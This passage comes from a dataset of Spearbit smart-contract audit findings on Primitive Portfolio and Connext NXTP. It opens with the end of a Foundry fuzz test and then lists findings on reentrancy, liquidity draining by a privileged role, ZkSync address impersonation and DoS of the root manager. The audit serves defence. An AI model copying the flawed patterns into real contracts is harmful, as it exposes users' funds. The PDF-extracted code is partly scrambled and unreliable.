creationTimestamp,) = NormalStrategy(pool.strategy).configs(ghost().poolId); tv.ttm = creationTimestamp + tv.durationSeconds - block.timestamp; if (printLogs) { console.log(\"strike: \", tv.strike); console.log(\"volatility_bps: \", tv.volatility_bps); console.log(\"durationSeconds: \", tv.durationSeconds); console.log(\"creationTimestamp: \", creationTimestamp); console.log(\"block.timestamp: \", block.timestamp); console.log(\"ttm: \", tv.ttm); console.log(\"protocol fee: \", subject().protocolFee()); console.log(\"pool fee: \", pool.feeBasisPoints); console.log(\"pool priority fee: \", pool.priorityFeeBasisPoints); } } bool sellAsset = true; if (printLogs) console.log(\"sellAsset: \", sellAsset); { bool swapExecuted = _fuzz_random_args(sellAsset, amtIn, amtOut); 9 if (!swapExecuted) return; // not interesting to check swap if it didn't execute } pool = ghost().pool(); (uint256 postXPerL, uint256 postYPerL) = (pool.virtualX, pool.virtualY); if (printLogs) { console.log(\"x_end: \", postXPerL); console.log(\"y_end: \", postYPerL); } = \"python3\"; = \"../primitive-math-venv/primitive-sim/check_swap_result.py\"; = \"--x\"; = vm.toString(preXPerL); = \"--y\"; = vm.toString(preYPerL); = \"--strike\"; = vm.toString(tv.strike); = \"--vol_bps\"; = vm.toString(tv.volatility_bps); string[] memory cmds = new string[](18); cmds[0] cmds[1] cmds[2] cmds[3] cmds[4] cmds[5] cmds[6] cmds[7] cmds[8] cmds[9] cmds[10] = \"--duration\"; cmds[11] = vm.toString(tv.durationSeconds); cmds[12] = \"--ttm\"; cmds[13] = vm.toString(tv.ttm); cmds[14] = \"--xprime\"; cmds[15] = vm.toString(postXPerL); cmds[16] = \"--yprime\"; cmds[17] = vm.toString(postYPerL); bytes memory result = vm.ffi(cmds); (uint256 idealFinalYPerL) = abi.decode(result, (uint256)); if (printLogs) console.log(\"idealFinalYPerL: \", idealFinalYPerL); // Only worried if swap was _better_ than ideal if (idealFinalYPerL > postYPerL) { uint256 diff = idealFinalYPerL - postYPerL; uint256 percentErrWad = diff * 1e18 / idealFinalYPerL; if (printLogs) console.log(\"%% err wad: \", percentErrWad); // assert at worst 2% error assertLt(percentErrWad, 0.02 * 1e18); } } function test_swap_gt_5pct_dev_in_swapper_favor() public defaultConfig useActor usePairTokens(10 ether) allocateSome(1 ether) { uint256 amtIn = 524204019310836059902749478707356665714276202503631350973429403; uint256 amtOut = 0; PortfolioPool memory pool = ghost().pool(); (uint256 preXPerL, uint256 preYPerL) = (pool.virtualX, pool.virtualY); if (printLogs) { console.log(\"x_start: \", preXPerL); console.log(\"y_start: \", preYPerL); } TestVals memory tv; 10 { uint256 creationTimestamp; (tv.strike, tv.volatility_bps, tv.durationSeconds, creationTimestamp,) = NormalStrategy(pool.strategy).configs(ghost().poolId); tv.ttm = creationTimestamp + tv.durationSeconds - block.timestamp; if (printLogs) { console.log(\"strike: \", tv.strike); console.log(\"volatility_bps: \", tv.volatility_bps); console.log(\"durationSeconds: \", tv.durationSeconds); console.log(\"creationTimestamp: \", creationTimestamp); console.log(\"block.timestamp: \", block.timestamp); console.log(\"ttm: \", tv.ttm); console.log(\"protocol fee: \", subject().protocolFee()); console.log(\"pool fee: \", pool.feeBasisPoints); console.log(\"pool priority fee: \", pool.priorityFeeBasisPoints); } } bool sellAsset = true; if (printLogs) console.log(\"sellAsset: \", sellAsset); { bool swapExecuted = _fuzz_random_args(sellAsset, amtIn, amtOut); if (!swapExecuted) return; // not interesting to check swap if it didn't execute } pool = ghost().pool(); (uint256 postXPerL, uint256 postYPerL) = (pool.virtualX, pool.virtualY); if (printLogs) { console.log(\"x_end: \", postXPerL); console.log(\"y_end: \", postYPerL); } = \"python3\"; = \"../primitive-math-venv/primitive-sim/check_swap_result.py\"; = \"--x\"; = vm.toString(preXPerL); = \"--y\"; = vm.toString(preYPerL); = \"--strike\"; = vm.toString(tv.strike); = \"--vol_bps\"; = vm.toString(tv.volatility_bps); string[] memory cmds = new string[](18); cmds[0] cmds[1] cmds[2] cmds[3] cmds[4] cmds[5] cmds[6] cmds[7] cmds[8] cmds[9] cmds[10] = \"--duration\"; cmds[11] = vm.toString(tv.durationSeconds); cmds[12] = \"--ttm\"; cmds[13] = vm.toString(tv.ttm); cmds[14] = \"--xprime\"; cmds[15] = vm.toString(postXPerL); cmds[16] = \"--yprime\"; cmds[17] = vm.toString(postYPerL); bytes memory result = vm.ffi(cmds); (uint256 idealFinalYPerL) = abi.decode(result, (uint256)); if (printLogs) console.log(\"idealFinalYPerL: \", idealFinalYPerL); // Only worried if swap was _better_ than ideal if (idealFinalYPerL > postYPerL) { uint256 diff = idealFinalYPerL - postYPerL; uint256 percentErrWad = diff * 1e18 / idealFinalYPerL; if (printLogs) console.log(\"%% err wad: \", percentErrWad); 11 // assert at worst 2% error assertLt(percentErrWad, 0.05 * 1e18); } } function test_swap_gt_25pct_dev_in_swapper_favor() public defaultConfig useActor usePairTokens(10 ether) allocateSome(1 ether) { uint256 amtIn = 110109023928019935126448015360767432374367360662791991077231763772041488708545; uint256 amtOut = 0; PortfolioPool memory pool = ghost().pool(); (uint256 preXPerL, uint256 preYPerL) = (pool.virtualX, pool.virtualY); if (printLogs) { console.log(\"x_start: \", preXPerL); console.log(\"y_start: \", preYPerL); } TestVals memory tv; { uint256 creationTimestamp; (tv.strike, tv.volatility_bps, tv.durationSeconds, creationTimestamp,) = NormalStrategy(pool.strategy).configs(ghost().poolId); tv.ttm = creationTimestamp + tv.durationSeconds - block.timestamp; if (printLogs) { console.log(\"strike: \", tv.strike); console.log(\"volatility_bps: \", tv.volatility_bps); console.log(\"durationSeconds: \", tv.durationSeconds); console.log(\"creationTimestamp: \", creationTimestamp); console.log(\"block.timestamp: \", block.timestamp); console.log(\"ttm: \", tv.ttm); console.log(\"protocol fee: \", subject().protocolFee()); console.log(\"pool fee: \", pool.feeBasisPoints); console.log(\"pool priority fee: \", pool.priorityFeeBasisPoints); } } bool sellAsset = true; if (printLogs) console.log(\"sellAsset: \", sellAsset); { bool swapExecuted = _fuzz_random_args(sellAsset, amtIn, amtOut); if (!swapExecuted) return; // not interesting to check swap if it didn't execute } pool = ghost().pool(); (uint256 postXPerL, uint256 postYPerL) = (pool.virtualX, pool.virtualY); if (printLogs) { console.log(\"x_end: \", postXPerL); console.log(\"y_end: \", postYPerL); } string[] memory cmds = new string[](18); cmds[0] cmds[1] cmds[2] cmds[3] cmds[4] = \"python3\"; = \"../primitive-math-venv/primitive-sim/check_swap_result.py\"; = \"--x\"; = vm.toString(preXPerL); = \"--y\"; 12 = vm.toString(preYPerL); = \"--strike\"; = vm.toString(tv.strike); = \"--vol_bps\"; = vm.toString(tv.volatility_bps); cmds[5] cmds[6] cmds[7] cmds[8] cmds[9] cmds[10] = \"--duration\"; cmds[11] = vm.toString(tv.durationSeconds); cmds[12] = \"--ttm\"; cmds[13] = vm.toString(tv.ttm); cmds[14] = \"--xprime\"; cmds[15] = vm.toString(postXPerL); cmds[16] = \"--yprime\"; cmds[17] = vm.toString(postYPerL); bytes memory result = vm.ffi(cmds); (uint256 idealFinalYPerL) = abi.decode(result, (uint256)); if (printLogs) console.log(\"idealFinalYPerL: \", idealFinalYPerL); // Only worried if swap was _better_ than ideal if (idealFinalYPerL > postYPerL) { uint256 diff = idealFinalYPerL - postYPerL; uint256 percentErrWad = diff * 1e18 / idealFinalYPerL; if (printLogs) console.log(\"%% err wad: \", percentErrWad); // assert at worst 25% error assertLt(percentErrWad, 0.25 * 1e18); } } }", "labels": ["Spearbit", "Primitive", "Severity: Low Risk"]}, {"title": "getMaxOrder overestimates output values", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review-July.pdf", "body": "The getMaxOrder function adds + 1 to the output value, overestimating the output value. This can lead to failed swaps if this value is used. tempOutput = pool.virtualY - lowerY.mulWadDown(pool.liquidity) + 1; also easy It's erY.mulWadDown(pool.liquidity) + 1 = pool.virtualY + 1, more than the pool reserves. that with lowerY = 0 we see to have i.e., tempOutput = pool.virtualY - low- the max out amount would be", "labels": ["Spearbit", "Primitive", "Severity: Low Risk"]}, {"title": "Improve reentrancy guards", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review-July.pdf", "body": "Previously, only settlement performed calls to arbitrary addresses through ERC20 transfers. With recent additions, like the ERC1155._mint and user-provided strategies, single actions like allocate and swap also perform calls to potentially malicious contracts. This increases the attack surface for reentrancy attacks. The current way of protecting against reentrancy works by setting multicall flags (_currentMulticall) and locks (preLock() and postLock()) on multicalls and single-action calls. However, the single calls essentially skip reen- trancy guards if the outer context is a multicall. This still allows for reentrancy through control flows like the following: // reenter during multicall's action execution multicall preLock() singleCall() reenter during current execution singeCall() preLock(): passes because we're in multicall skips settlement postLock(): passes because we're in multicall _currentMulticall = false; settlement() postLock() // reenter during multicall's settlement multicall preLock() singleCall preLock(): ... postLock(): `_locked = 1` _currentMulticall = false; settlement() reenter singeCall() passes preLock because not locked mutliCall() passes multicall reentrancy guard because not in multicall passes preLock because not locked ... settlement finishes postLock()", "labels": ["Spearbit", "Primitive", "Severity: Low Risk"]}, {"title": "approximatePriceGivenX does not need to compute y-bounds", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review-July.pdf", "body": "The approximatePriceGivenX function does not need to compute the y-bounds by calling self.getReserveYBounds().", "labels": ["Spearbit", "Primitive", "Severity: Gas Optimization"]}, {"title": "Unnecessary computations in NormalStrategy.beforeSwap", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review-July.pdf", "body": "The NormalStrategy.sol.beforeSwap function calls getSwapInvariants to simulate an entire swap with current and post-swap invariants. However, only the current invariant value is used.", "labels": ["Spearbit", "Primitive", "Severity: Gas Optimization"]}, {"title": "Pools can use malicious strategies", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review-July.pdf", "body": "Anyone can create pools and configure the pool to use a custom strategy. A malicious strategy can disable swapping and (de-)allocating at any time, as well as enable privileged parties to trade out all pool reserves by implementing custom logic in the validateSwap function.", "labels": ["Spearbit", "Primitive", "Severity: Informational"]}, {"title": "findRootForSwappingIn functions should use MINIMUM_INVARIANT_DELTA", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review-July.pdf", "body": "The findRootForSwappingInX and findRootForSwappingInY functions add + 1 to the previous curve invariant tradingFunction(curve) - (curve.invariant + 1)", "labels": ["Spearbit", "Primitive", "Severity: Informational"]}, {"title": "Unused Errors", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review-July.pdf", "body": "The NormalStrategyLib_UpperPriceLimitReached and NormalStrategyLib_LowerPriceLim- itReached errors are not used.", "labels": ["Spearbit", "Primitive", "Severity: Informational"]}, {"title": "getSwapInvariants order output can be 1 instead of 2", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review-July.pdf", "body": "The getSwapInvariants function is used to simulate swaps for the getAmountOut and beforeSwap functions. These functions use an artificial output value of 2 such that the function does not revert.", "labels": ["Spearbit", "Primitive", "Severity: Informational"]}, {"title": "AfterCreate event uses wrong durationSeconds value if pool is perpetual", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review-July.pdf", "body": "The AfterCreate uses the cached config.durationSeconds value but the real value the config storage struct is initialized with will be SECONDS_PER_YEAR in the case of perpetual pools.", "labels": ["Spearbit", "Primitive", "Severity: Informational"]}, {"title": "Unnecessary fee reserves check", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review-July.pdf", "body": "The fee amount is always taken on the input and the fee percentage is always less than 100%. Therefore, the fee is always less than the input. The following check should never fail adjustedInputReserveWad += self.input; // feeAmountUnit <= self.input <= adjustedInputReserveWad if (feeAmountUnit > adjustedInputReserveWad) revert SwapLib_FeeTooHigh();", "labels": ["Spearbit", "Primitive", "Severity: Informational"]}, {"title": "swapInternal() shouldn't use msg.sender", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "As reported by the Connext team, the internal stable swap checks if msg.sender has sufficient funds on execute(). This msg.sender is the relayer which normally wouldn't have these funds so the swaps would fail. The local funds should come from the Connext diamond itself. BridgeFacet.sol function execute(ExecuteArgs calldata _args) external nonReentrant whenNotPaused returns (bytes32) { ... (uint256 amountOut, address asset, address local) = _handleExecuteLiquidity(...); ... } function _handleExecuteLiquidity(...) ... { ... (uint256 amount, address adopted) = AssetLogic.swapFromLocalAssetIfNeeded(...); ... } AssetLogic.sol function swapFromLocalAssetIfNeeded(...) ... { ... return _swapAsset(...); } function _swapAsset(... ) ... { ... SwapUtils.Swap storage ipool = s.swapStorages[_key]; if (ipool.exists()) { // Swap via the internal pool. return ... ipool.swapInternal(...) ... } } SwapUtils.sol function swapInternal(...) ... { IERC20 tokenFrom = self.pooledTokens[tokenIndexFrom]; require(dx <= tokenFrom.balanceOf(msg.sender), \"more than you own\"); ... } // msg.sender is the relayer", "labels": ["Spearbit", "ConnextNxtp", "Severity: High Risk"]}, {"title": "MERKLE.insert does not return the updated tree leaf count", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "The NatSpec comment for insert is * @return uint256 Updated count (number of nodes in the tree). But that is not true. If the updated count is 2k (2n + 1) where k , n 2 N [ 0 then the return value would be 2n + 1. Currently, the returned value of insert is not being used, otherwise, this could be a bigger issue.", "labels": ["Spearbit", "ConnextNxtp", "Severity: High Risk"]}, {"title": "PolygonSpokeConnector or PolygonHubConnector can get compromised and DoSed if an address(0) is passed to their constructor for _mirrorConnector", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "PolygonSpokeConnector (PolygonHubConnector) inherits from SpokeConnector (HubConnector) and FxBaseChildTunnel (FxBaseRootTunnel). When PolygonSpokeConnector (PolygonHubConnector) gets de- ployed and its constructor is called, if _mirrorConnector == address(0) then setting the mirrorConnector stor- age variable is skipped: // File: Connector.sol#L118-L121 if (_mirrorConnector != address(0)) { _setMirrorConnector(_mirrorConnector); } Now since the setFxRootTunnel (setFxChildTunnel) is an unprotected endpoint that is not overridden by it and assign their own fxRootTunnel PolygonSpokeConnector (PolygonHubConnector) anyone can call (fxChildTunnel) address (note, fxRootTunnel (fxChildTunnel) is supposed to correspond to mirrorConnector on the destination domain). the require statement in setFxRootTunnel (setFxChildTunnel) only allows fxRootTunnel Note that (fxChildTunnel) to be set once (non-zero address value) so afterward even the owner cannot update this value. If at some later time the owner tries to call setMirrorConnector to assign the mirrorConnector, since _setMir- rorConnector is overridden by PolygonSpokeConnector (PolygonHubConnector) the following will try to execute: 9 // File: PolygonSpokeConnector.sol#L78-L82 function _setMirrorConnector(address _mirrorConnector) internal override { super._setMirrorConnector(_mirrorConnector); setFxRootTunnel(_mirrorConnector); } Or for PolygonHubConnector: // File: PolygonHubConnector.sol#L51-L55 function _setMirrorConnector(address _mirrorConnector) internal override { super._setMirrorConnector(_mirrorConnector); setFxChildTunnel(_mirrorConnector); } But this will revert since fxRootTunnel (fxChildTunnel) is already set. Thus if the owner of PolygonSpokeConnec- tor (PolygonHubConnector) does not provide a non-zero address value for mirrorConnector upon deployment, a malicious actor can set fxRootTunnel which will cause: 1. Rerouting of messages from Polygon to Ethereum to an address decided by the malicious actor (or vice versa for PolygonHubConnector). 2. DoSing the setMirrorConnector and setFxRootTunnel (fxChildTunnel) endpoints for the owner. PolygonSpokeConnector's", "labels": ["Spearbit", "ConnextNxtp", "Severity: High Risk"]}, {"title": "A malicious owner or user with a Role.Router role can drain a router's liquidity", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "A malicious owner or user with Role.Router Role denominated as A in this example, can drain a router's liquidity for a current router (a router that has already been added to the system and might potentially have added big liquidities to some assets). Here is how A can do it (can also be done atomically): 1. Remove the router by calling removeRouter. 2. Add the router back by calling setupRouter and set the owner and recipient parameters to accounts A has access to / control over. 3. Loop over all tokens that the router has liquidity and call removeRouterLiquidityFor to drain/redirect the funds into accounts A has control over. That means all routers would need to put their trust in the owner (of this connext instance) and any user who has a Role.Router Role with their liquidity. So the setup is not trustless currently.", "labels": ["Spearbit", "ConnextNxtp", "Severity: High Risk"]}, {"title": "Users are forced to accept any slippage on the destination chain", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "The documentation mentioned that there is cancel function on the destination domain that allows users to send the funds back to the origin domain, accepting the loss incurred by slippage from the origin pool. However, this feature is not found in the current codebase. If the high slippage rate persists continuously on the destination domain, the users will be forced to accept the high slippage rate. Otherwise, their funds will be stuck in Connext.", "labels": ["Spearbit", "ConnextNxtp", "Severity: High Risk"]}, {"title": "Preservation of msg.sender in ZkSync could break certain trust assumption", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "For ZkSync chain, the msg.sender is preserved for L1 -> L2 calls. One of the rules when pursuing a cross-chain strategy is to never assume that address control between L1 and L2 is always guaranteed. For EOAs (i.e., non-contract accounts), this is generally true that any account that can be accessed on Ethereum will also be accessible on other EVM-based chains. However, this is not always true for contract-based accounts as the same account/wallet address might be owned by different persons on different chains. This might happen if there is a poorly implemented smart contract wallet factory on multiple EVM-based chains that deterministically deploys a wallet based on some user-defined inputs. For instance, if a smart contract wallet factory deployed on both EVM-based chains uses deterministic CREATE2 which allows users to define its salt when deploying the wallet, Bob might use ABC as salt in Ethereum and Alice might use ABC as salt in Zksync. Both of them will end up getting the same wallet address on two different chains. A similar issue occurred in the Optimism-Wintermute Hack, but the actual incident is more complicated. Assume that 0xABC is a smart contract wallet owned and deployed by Alice on ZkSync chain. Alice performs a xcall from Ethereum to ZkSync with delegate set to 0xABC address. Thus, on the destination chain (ZkSync), only Alice's smart contract wallet 0xABC is authorized to call functions protected by the onlyDelegate modifier. 11 Bob (attacker) saw that the 0xABC address is not owned by anyone on Ethereum. Therefore, he proceeds to take ownership of the 0xABC by interacting with the wallet factory to deploy a smart contract wallet on the same address on Ethereum. Bob can do so by checking out the inputs that Alice used to create the wallet previously. Thus, Bob can technically make a request from L1 -> L2 to impersonate Alice's wallet (0xABC) and bypass the onlyDelegate modifier on ZkSync. Additionally, Bob could make a L1 -> L2 request by calling the ZKSync's BridgeFacet.xcall directly to steal Alice's approved funds. Since the xcall relies on msg.sender, it will assume that the caller is Alice. This issue is only specific to ZkSync chain due to the preservation of msg.sender for L1 -> L2 calls. For the other chains, the msg.sender is not preserved for L1 -> L2 calls and will always point to the L2's AMB forwarding the requests.", "labels": ["Spearbit", "ConnextNxtp", "Severity: High Risk"]}, {"title": "No way to update a Stable Swap once assigned to a key", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "Once a Stable Swap is assigned to a key (the hash of the canonical id and domain for token), it cannot be updated nor deleted. A Swap can be hacked or an improved version may be released which will warrant updating the Swap for a key.", "labels": ["Spearbit", "ConnextNxtp", "Severity: High Risk"]}, {"title": "Renouncing ownership or admin role could affect the normal operation of Connext", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "Consider the following scenarios.  Instance 1 - Renouncing ownership All the contracts that extend from ProposedOwnable or ProposedOwnableUpgradeable inherit a method called renounceOwnership. The owner of the contract can use this method to give up their ownership, thereby leaving the contract without an owner. If that were to happen, it would not be possible to perform any owner-specific functionality on that contract anymore. The following is a summary of the affected contracts and their impact if the ownership has been renounced. 12 One of the most significant impacts is that Connext's message system cannot recover after a fraud has been resolved since there is no way to unpause and add the connector back to the system.  Instance 2 - Renouncing admin role All the contracts that extend from ProposedOwnableFacet inherit a method called revokeRole. 1. Assume that the Owner has renounced its power and the only Admin remaining used revokeRole to re- nounce its Admin role. 2. Now the contract is left with Zero Owner & Admin. 3. All swap operations collect adminFees via SwapUtils.sol contract. In absence of any Admin & Owner, these fees will get stuck in the contract with no way to retrieve them. Normally it would have been withdrawn using withdrawSwapAdminFees|SwapAdminFacet.sol. 4. This is simply one example, there are multiple other critical functionalities impacted once both Admin and Owner revoke their roles.", "labels": ["Spearbit", "ConnextNxtp", "Severity: High Risk"]}, {"title": "No way of removing Fraudulent Roots", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "Fraudulent Roots cannot be removed once fraud is detected by the Watcher. This means that Fraud Roots will be propogated to each chain.", "labels": ["Spearbit", "ConnextNxtp", "Severity: High Risk"]}, {"title": "Large number of inbound roots can DOS the RootManager", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "It is possible to perform a DOS against the RootManager by exploiting the dequeueVerified function or insert function of the RootManager.sol. The following describes the possible attack path: 1. Assume that a malicious user calls the permissionless GnosisSpokeConnector.send function 1000 times (or any number of times that will cause an Out-of-Gas error later) within a single transaction/block on Gnosis causing a large number of Gnosis's outboundRoots to be forwarded to GnosisHubConnector on Ethereum. 2. Since the 1000 outboundRoots were sent at the same transaction/block earlier, all of them should arrive at the GnosisHubConnector within the same block/transaction on Ethereum. 13 3. For each of the 1000 outboundRoots received, the GnosisHubConnector.processMessage function will be triggered to process it, which will in turn call the RootManager.aggregate function to add the received out- boundRoot into the pendingInboundRoots queue. As a result, 1000 outboundRoots with the same commit- Block will be added to the pendingInboundRoots queue. 4. After the delay period, the RootManager.propagate function will be triggered. The function will call the dequeueVerified function to dequeue 1000 verified outboundRoots from the pendingInboundRoots queue by looping through the queue. This might result in an Out-of-Gas error and cause a revert. 5. If the above dequeueVerified function does not revert, the RootManager.propagate function will attempt to insert 1000 verified outboundRoots to the aggregated Merkle tree, which might also result in an Out-of-Gas error and cause a revert. If the RootManager.propagate function reverts when called, the latest aggregated Merkle root cannot be forwarded to the spokes. As a result, none of the messages can be proven and processed on the destination chains. Note: the processing on the Hub (which is on mainnet) can also become very expensive, as the mainnet usually as a far higher gas cost than the Spoke.", "labels": ["Spearbit", "ConnextNxtp", "Severity: High Risk"]}, {"title": "Missing mirrorConnector check on Optimism hub connector", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "processMessageFromRoot() calls _processMessage() to process messages for the \"fast\" path. But _processMessage() can also be called by the AMB in the slow path. The second call to _processMessage() is not necessary (and could double process the message, which luckily is prevented via the processed[] mapping). The second call (from the AMB directly to _processMessage()) also doesn't properly verify the origin of the message, which might allow the insertion of fraudulent messages. 14 function processMessageFromRoot(...) ... { ... _processMessage(abi.encode(_data)); ... } function _processMessage(bytes memory _data) internal override { // sanity check root length require(_data.length == 32, \"!length\"); // get root from data bytes32 root = bytes32(_data); if (!processed[root]) { // set root to processed processed[root] = true; // update the root on the root manager IRootManager(ROOT_MANAGER).aggregate(MIRROR_DOMAIN, root); } // otherwise root was already sent to root manager }", "labels": ["Spearbit", "ConnextNxtp", "Severity: High Risk"]}, {"title": "Add _mirrorConnector to _sendMessage of BaseMultichain", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "The function _sendMessage() of BaseMultichain sends the message to the address of the _amb. This doesn't seem right as the first parameter is the target contract to interact with according to multichain cross- chain. This should probably be the _mirrorConnector. function _sendMessage(address _amb, bytes memory _data) internal { Multichain(_amb).anyCall( _amb, // Same address on every chain, using AMB as it is immutable ... ); }", "labels": ["Spearbit", "ConnextNxtp", "Severity: High Risk"]}, {"title": "Unauthorized access to change acceptanceDelay", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "The acceptanceDelay along with supportedInterfaces[] can be set by any user without the need of any Authorization once the init function of DiamondInit has been called and set. This is happening since caller checks (LibDiamond.enforceIsContractOwner();) are missing for these fields. Since acceptanceDelay defines the time post which certain action could be executed, setting a very large value could DOS the system (new owner cannot be set) and setting very low value could make changes without consid- eration time (Setting/Renounce Admin, Disable whitelisting etc at ProposedOwnableFacet.sol )", "labels": ["Spearbit", "ConnextNxtp", "Severity: High Risk"]}, {"title": "Messages destined for ZkSync cannot be processed", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "For ZkSync chain, L2 to L1 communication is free, but L1 to L2 communication requires a certain amount of ETH to be supplied to cover the base cost of the transaction (including the _l2Value) + layer 2 operator tip. The _sendMessage function of ZkSyncHubConnector.sol relies on the IZkSync(AMB).requestL2Transaction function to send messages from L1 to L2. However, the requestL2Transaction call will always fail because no ETH is supplied to the transaction (msg.value is zero). As a result, the ZkSync's hub connector on Ethereum cannot forward the latest aggregated Merkle root to the ZkSync's spoke connector on ZkSync chain. Thus, any message destined for ZkSync chain cannot be processed since incoming messages cannot be proven without the latest aggregated Merkle root. 16 function _sendMessage(bytes memory _data) internal override { // Should always be dispatching the aggregate root require(_data.length == 32, \"!length\"); // Get the calldata bytes memory _calldata = abi.encodeWithSelector(Connector.processMessage.selector, _data); // Dispatch message // [v2-docs.zksync.io/dev/developer-guides/Bridging/l1-l2.html#structure](https://v2-docs.zksync.io/d ,! ev/developer-guides/Bridging/l1-l2.html#structure) // calling L2 smart contract from L1 Example contract // note: msg.value must be passed in and can be retrieved from the AMB view function ,! `l2TransactionBaseCost` c // [v2-docs.zksync.io/dev/developer-guides/Bridging/l1-l2.html#using-contract-interface-in-your-proje ct](https://v2-docs.zksync.io/dev/developer-guides/Bridging/l1-l2.html#using-contract-interface-in- your-project) c c ,! ,! IZkSync(AMB).requestL2Transaction{value: msg.value}( // The address of the L2 contract to call mirrorConnector, // We pass no ETH with the call 0, // Encoding the calldata for the execute _calldata, // Ergs limit 10000, // factory dependencies new bytes[]0 ); } Additionally, the ZkSync's hub connector contract needs to be loaded with ETH so that it can forward the appro- priate amount of ETH when calling the ZkSync's requestL2Transaction. However, it is not possible to do so because no receive(), fallback or payable function has been implemented within the contract and its parent contracts for accepting ETH.", "labels": ["Spearbit", "ConnextNxtp", "Severity: High Risk"]}, {"title": "Cross-chain messaging via Multichain protocol will fail", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "Multichain v6 is supported by Connext for cross-chain messaging. The _sendMessage function of BaseMultichain.sol relies on Multichain's anyCall for cross-chain messaging. Per the Anycall V6 documentation, a gas fee for transaction execution needs to be paid either on the source or destination chain when an anyCall is called. However, the anyCall is called without consideration of the gas fee within the connectors, and thus the anyCall will always fail. Since Multichain's hub and spoke connectors are unable to send messages, cross-chain messaging using Multichain within Connext will not work. 17 function _sendMessage(address _amb, bytes memory _data) internal { Multichain(_amb).anyCall( _amb, // Same address on every chain, using AMB as it is immutable _data, address(0), // fallback address on origin chain MIRROR_CHAIN_ID, 0 // fee paid on origin chain ); } Additionally, for the payment of the execution gas fee, a project can choose to implement either of the following methods:  Pay on the source chain by depositing the gas fee to the caller contracts.  Pay on the destination chain by depositing the gas fee to Multichain's anyCall contract at the destination chain. If Connext decides to pay the gas fee on the source chain, they would need to deposit some ETH to the connector contracts. However, it is not possible because no receive(), fallback or payable function has been implemented within the contracts and their parent contracts for accepting ETH.", "labels": ["Spearbit", "ConnextNxtp", "Severity: High Risk"]}, {"title": "_domainSeparatorV4() not updated after name/symbol change", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "The BridgeToken allows updating the name and symbol of a token. However the _CACHED_DOMAIN_- SEPARATOR (of EIP712) isn't updated. This means that permit(), which uses _hashTypedDataV4() and _CACHED_- DOMAIN_SEPARATOR, still uses the old value. On the other hand DOMAIN_SEPARATOR() is updated. Both and especially their combination can give unexpected results. BridgeToken.sol function setDetails(string calldata _newName, string calldata _newSymbol) external override onlyOwner { // careful with naming convention change here token.name = _newName; token.symbol = _newSymbol; emit UpdateDetails(_newName, _newSymbol); } OZERC20.sol 18 function DOMAIN_SEPARATOR() external view override returns (bytes32) { // See {EIP712._buildDomainSeparator} return keccak256( abi.encode(_TYPE_HASH, keccak256(abi.encode(token.name)), _HASHED_VERSION, block.chainid, ,! address(this)) ); } function permit(...) ... { ... bytes32 _hash = _hashTypedDataV4(_structHash); ... } draft-EIP712.sol import \"./EIP712.sol\"; EIP712.sol function _hashTypedDataV4(bytes32 structHash) internal view virtual returns (bytes32) { return ECDSA.toTypedDataHash(_domainSeparatorV4(), structHash); } function _domainSeparatorV4() internal view returns (bytes32) { if (address(this) == _CACHED_THIS && block.chainid == _CACHED_CHAIN_ID) { return _CACHED_DOMAIN_SEPARATOR; } else { return _buildDomainSeparator(_TYPE_HASH, _HASHED_NAME, _HASHED_VERSION); } }", "labels": ["Spearbit", "ConnextNxtp", "Severity: Medium Risk"]}, {"title": "diamondCut() allows re-execution of old updates", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "Once diamondCut() is executed, ds.acceptanceTimes[keccak256(abi.encode(_diamondCut, _- init, _calldata))] is not reset to zero. This means the contract owner can rerun the old updates again without any delay by executing diamondCut() function. Assume the following: diamondCut() function is executed to update the facet selector with version_2 A bug is found in ver- sion_2 and it is rolled back Owner can still execute diamondCut() function which will again update the facet selector to version 2 since ds.acceptanceTimes[keccak256(abi.encode(_diamondCut, _init, _calldata))] is still valid", "labels": 